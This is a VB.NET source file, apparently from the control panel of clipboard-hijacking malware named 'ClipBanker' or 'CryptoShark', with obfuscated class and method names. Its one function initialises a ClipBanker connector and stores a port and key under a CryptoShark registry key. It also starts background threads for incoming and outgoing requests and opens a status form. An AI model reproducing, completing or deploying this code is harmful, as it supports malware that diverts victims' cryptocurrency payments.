Imports System.Net
Imports System.Threading
Imports System.Windows.Forms.VisualStyles.VisualStyleElement
Imports System.Windows.Forms.VisualStyles.VisualStyleElement.Button
Public Class Class2
    Friend Shared Function method3() As Object

        Try
            Gclass1.Port = Class3.method1
            Gclass1.KEY = Class4.method3
            Gclass1.Blocked = New List(Of String)
            ClipBanker.Connector.SetUp()
            ClipBanker.Connector.Shutdown()
            Try
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
    "Port", Class5.return1)
            Catch ex As Exception
            End Try
            Try
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\CryptoShark",
    "Key", Class4.long3)
            Catch ex As Exception
            End Try
            Try
                CClient2.F = form1
                Pending.Req_In = New List(Of Incoming_Requests)
                Dim Req_In As New Thread(New ThreadStart(AddressOf Pending.Incoming))
                Req_In.IsBackground = True
                Req_In.Start()

                Pending.Req_Out = New List(Of Outcoming_Requests)
                Dim Req_Out As New Thread(New ThreadStart(AddressOf Pending.OutComing))
                Req_Out.IsBackground = True
                Req_Out.Start()
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
            Class1.string3()
            form1.Timer_Status.Start()
            Class3.return()
            form1.Show()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function

End Class
